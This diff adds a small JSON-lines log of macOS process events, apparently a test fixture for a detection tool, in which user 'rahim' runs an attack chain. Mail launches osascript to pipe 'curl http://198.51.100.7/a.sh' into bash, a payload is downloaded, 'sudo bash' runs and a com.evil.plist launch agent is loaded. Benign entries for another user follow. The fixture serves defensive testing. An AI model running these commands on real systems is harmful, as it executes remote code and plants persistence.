@@ -1,0 +1,8 @@
+{"timestamp":"2026-07-13T02:30:00","event_type":"LOGIN_SUCCESS","user":"rahim","details":"console login"}
+{"timestamp":"2026-07-13T02:31:10","event_type":"PROCESS_START","user":"rahim","image":"/usr/bin/osascript","command":"osascript -e 'do shell script \"curl http://198.51.100.7/a.sh | bash\"'","parent":"/Applications/Mail.app/Contents/MacOS/Mail"}
+{"timestamp":"2026-07-13T02:32:05","event_type":"PROCESS_START","user":"rahim","image":"/Volumes/USBDRIVE/installer","command":"/Volumes/USBDRIVE/installer","parent":"/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"}
+{"timestamp":"2026-07-13T02:33:20","event_type":"PROCESS_START","user":"rahim","image":"/usr/bin/curl","command":"curl http://198.51.100.7/payload -o /tmp/payload","parent":"/bin/zsh"}
+{"timestamp":"2026-07-13T02:34:00","event_type":"PROCESS_START","user":"rahim","image":"/usr/bin/sudo","command":"sudo bash","parent":"/bin/zsh"}
+{"timestamp":"2026-07-13T02:35:30","event_type":"PROCESS_START","user":"rahim","image":"/bin/launchctl","command":"launchctl load /Users/rahim/Library/LaunchAgents/com.evil.plist","parent":"/bin/zsh"}
+{"timestamp":"2026-07-13T09:00:00","event_type":"LOGIN_SUCCESS","user":"sadia","details":"morning login"}
+{"timestamp":"2026-07-13T09:05:00","event_type":"PROCESS_START","user":"sadia","image":"/Applications/Safari.app/Contents/MacOS/Safari","command":"Safari","parent":"/sbin/launchd"}
